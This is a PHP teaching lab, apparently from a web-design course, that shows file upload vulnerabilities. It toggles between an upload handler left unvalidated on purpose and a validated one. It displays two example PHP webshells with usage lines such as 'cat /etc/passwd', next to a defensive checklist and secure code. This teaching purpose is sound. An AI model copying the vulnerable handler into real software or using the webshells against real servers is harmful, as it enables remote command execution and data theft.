<?php
/**
 * Project: Web Design Course Presentation - Hacker Edition
 * Author: Amin Davodian (Mohammadamin Davodian)
 * Website: https://senioramin.com
 * LinkedIn: https://linkedin.com/in/SudoAmin
 * GitHub: https://github.com/SeniorAminam
 * Created: 2025-11-24
 * 
 * File Upload Vulnerability Lab - Demonstrates dangerous file upload attacks
 * Developed by Amin Davodian
 */

$uploadDir = 'uploads/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

$message = '';
$uploadedFile = '';
$secureMode = isset($_GET['secure']) && $_GET['secure'] == 1;

// Handle file upload - Developed by Amin Davodian
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
    $file = $_FILES['uploaded_file'];
    $fileName = $file['name'];
    $fileTmpName = $file['tmp_name'];
    $fileSize = $file['size'];
    $fileError = $file['error'];
    
    if ($fileError === UPLOAD_ERR_OK) {
        if ($secureMode) {
            // SECURE VERSION - Strict validation
            $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
            $allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif'];
            $maxSize = 2 * 1024 * 1024; // 2MB
            
            // Get file extension
            $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
            
            // Validate extension
            if (!in_array($fileExt, $allowedExtensions)) {
                $message = '❌ Invalid file type! Only JPG, PNG, GIF allowed.';
            } 
            // Validate MIME type
            elseif (!in_array($file['type'], $allowedMimeTypes)) {
                $message = '❌ Invalid MIME type detected!';
            }
            // Validate size
            elseif ($fileSize > $maxSize) {
                $message = '❌ File too large! Maximum 2MB allowed.';
            }
            // Additional validation: Check actual file content
            elseif (!getimagesize($fileTmpName)) {
                $message = '❌ Not a valid image file!';
            }
            else {
                // Generate secure filename
                $safeFileName = uniqid('img_', true) . '.' . $fileExt;
                $destination = $uploadDir . $safeFileName;
                
                if (move_uploaded_file($fileTmpName, $destination)) {
                    $message = '✅ File uploaded securely: ' . $safeFileName;
                    $uploadedFile = $destination;
                } else {
                    $message = '❌ Upload failed!';
                }
            }
        } else {
            // VULNERABLE VERSION - No validation!
            $destination = $uploadDir . $fileName;
            
            if (move_uploaded_file($fileTmpName, $destination)) {
                $message = '✅ File uploaded: ' . $fileName;
                $uploadedFile = $destination;
                
                // Check if it's a potential webshell
                $content = file_get_contents($destination);
                if (stripos($content, '<?php') !== false || stripos($content, '<?=') !== false) {
                    $message .= '<br><span style="color:var(--error-color);">⚠️ WARNING: PHP code detected! This could be a webshell!</span>';
                }
            } else {
                $message = '❌ Upload failed!';
            }
        }
    } else {
        $message = '❌ Upload error occurred!';
    }
}

// List uploaded files
$uploadedFiles = [];
if (is_dir($uploadDir)) {
    $uploadedFiles = array_diff(scandir($uploadDir), ['.', '..']);
}
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload Lab | Amin Davodian</title>
    <link rel="stylesheet" href="assets/style.css">
    <script src="assets/console-logger.js"></script>
    <link rel="stylesheet" href="assets/animations.css">
    <style>
        .file-preview {
            max-width: 100%;
            max-height: 300px;
            margin-top: 1rem;
            border: 2px solid var(--primary-color);
            border-radius: 4px;
        }
        .file-list {
            background: rgba(0,0,0,0.3);
            padding: 1rem;
            border-radius: 4px;
            margin-top: 1rem;
            max-height: 300px;
            overflow-y: auto;
        }
        .file-item {
            padding: 0.5rem;
            margin: 0.25rem 0;
            background: rgba(255,255,255,0.05);
            border-radius: 2px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .webshell-code {
            background: #000;
            color: var(--error-color);
            padding: 1rem;
            border: 1px solid var(--error-color);
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            margin-top: 1rem;
            direction: ltr;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="neon-text">📁 File Upload Vulnerability Lab</h1>
        
        <div style="text-align: center; margin-bottom: 2rem;">
            <a href="?secure=0" class="badge" style="<?php echo !$secureMode ? 'background:var(--error-color);' : ''; ?> padding:0.5rem 1rem; margin:0.5rem; text-decoration:none; color:white;">
                ❌ Vulnerable Upload
            </a>
            <a href="?secure=1" class="badge" style="<?php echo $secureMode ? 'background:var(--primary-color); color:#000;' : ''; ?> padding:0.5rem 1rem; margin:0.5rem; text-decoration:none; color:white;">
                ✅ Secure Upload
            </a>
        </div>

        <?php if ($message): ?>
            <div class="alert <?php echo strpos($message, '✅') !== false ? 'alert-success' : 'alert-error'; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <div class="grid">
            <!-- Upload Form -->
            <div class="card">
                <h2><?php echo $secureMode ? '✅ Secure Upload' : '❌ Vulnerable Upload'; ?></h2>
                <p><?php echo $secureMode ? 'Strict validation enabled' : 'No validation - Educational demo only!'; ?></p>
                
                <form method="POST" enctype="multipart/form-data">
                    <div class="form-group">
                        <label>Select File to Upload:</label>
                        <input type="file" name="uploaded_file" id="fileInput" required>
                    </div>
                    <button type="submit">Upload File</button>
                </form>

                <?php if ($uploadedFile && in_array(strtolower(pathinfo($uploadedFile, PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif'])): ?>
                    <img src="<?php echo htmlspecialchars($uploadedFile, ENT_QUOTES, 'UTF-8'); ?>" class="file-preview" alt="Uploaded image">
                <?php endif; ?>

                <div class="file-list">
                    <h3 style="color: var(--primary-color); font-size: 1rem;">📋 Uploaded Files:</h3>
                    <?php if (count($uploadedFiles) > 0): ?>
                        <?php foreach ($uploadedFiles as $file): ?>
                            <div class="file-item">
                                <span><?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?></span>
                                <span style="font-size: 0.8rem; color: var(--text-muted);">
                                    <?php echo number_format(filesize($uploadDir . $file) / 1024, 2); ?> KB
                                </span>
                            </div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <p style="color: var(--text-muted);">No files uploaded yet.</p>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Attack Demonstration -->
            <div class="card" style="border-color: var(--error-color);">
                <h2 style="color: var(--error-color);">💀 Webshell Attack</h2>
                <p>در حالت Vulnerable، هکر می‌تواند فایل PHP آپلود کند:</p>
                
                <div class="webshell-code">
                    <strong style="color: var(--error-color);">⚠️ Example Webshell (shell.php):</strong>
                    <pre style="margin-top: 0.5rem; color: var(--primary-color);">&lt;?php
// Simple Webshell - Educational Purpose Only!
system($_GET['cmd']);
?&gt;

// Usage:
// shell.php?cmd=ls -la
// shell.php?cmd=cat /etc/passwd
// shell.php?cmd=whoami</pre>
                </div>

                <div class="webshell-code">
                    <strong style="color: var(--error-color);">More Advanced Webshell:</strong>
                    <pre style="margin-top: 0.5rem; color: var(--primary-color);">&lt;?php
if(isset($_REQUEST['cmd'])){
    echo "&lt;pre&gt;";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "&lt;/pre&gt;";
    die;
}
?&gt;

&lt;!-- Web-based Command Panel --&gt;
&lt;form&gt;
    &lt;input name="cmd" type="text"&gt;
    &lt;input type="submit"&gt;
&lt;/form&gt;</pre>
                </div>

                <div style="margin-top: 2rem; padding: 1rem; background: rgba(16, 185, 129, 0.1); border-radius: 4px;">
                    <h3 style="color: var(--primary-color); font-size: 1rem;">🛡️ File Upload Protection:</h3>
                    <ul style="margin: 0.5rem 0; padding-right: 1.5rem; color: var(--text-muted); font-size: 0.9rem;">
                        <li><strong>Whitelist Extension:</strong> فقط فرمت‌های مجاز</li>
                        <li><strong>MIME Type Check:</strong> بررسی نوع واقعی فایل</li>
                        <li><strong>Content Validation:</strong> بررسی محتوای فایل</li>
                        <li><strong>Rename Files:</strong> تغییر نام به نام تصادفی</li>
                        <li><strong>File Size Limit:</strong> محدودیت حجم</li>
                        <li><strong>Upload Outside Webroot:</strong> ذخیره خارج از مسیر وب</li>
                        <li><strong>Disable Execution:</strong> غیرفعال کردن اجرای PHP</li>
                    </ul>
                </div>

                <div style="margin-top: 1rem; padding: 1rem; background: rgba(0,0,0,0.5); border-radius: 4px;">
                    <h3 style="color: var(--primary-color); font-size: 1rem;">📖 Secure Upload Code:</h3>
                    <pre style="margin: 0; font-size: 0.85rem;">$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], 
                PATHINFO_EXTENSION);

if (!in_array($ext, $allowed)) {
    die('Invalid file type!');
}

// Check MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, 
                   $_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png'];

if (!in_array($mime, $allowed_mimes)) {
    die('Invalid MIME type!');
}

// Rename file
$newName = uniqid() . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], 
                   'uploads/' . $newName);</pre>
                </div>
            </div>
        </div>

        <div style="text-align: center; margin-top: 2rem;">
            <a href="slides.html" style="color: var(--primary-color); text-decoration: none;">
                ← Back to Slides
            </a>
        </div>
    </div>
    <script>
        function simulateUpload(filename, type, size) {
            const fileInput = document.getElementById('fileInput');
            
            // Visual feedback
            fileInput.style.borderColor = type.includes('php') ? 'var(--error-color)' : 'var(--primary-color)';
            fileInput.style.backgroundColor = 'rgba(255,255,255,0.1)';
            
            setTimeout(() => {
                fileInput.style.borderColor = '';
                fileInput.style.backgroundColor = '';
            }, 500);
            
            if(window.logger) {
                const msg = `Selected File: ${filename} (${type}, ${size} bytes)`;
                const logType = filename.includes('.php') ? 'warning' : 'info';
                window.logger.log('Interaction', msg, logType);
                
                if(filename.includes('.php')) {
                    window.logger.log('Security', '⚠️ Potential Webshell Detected!', 'security');
                }
            }
            
            alert(`Simulated Selection:\nFile: ${filename}\nType: ${type}\n\n(Note: Browser security prevents programmatically setting file inputs. Please manually select a file to test.)`);
        }
    </script>
</body>
</html>

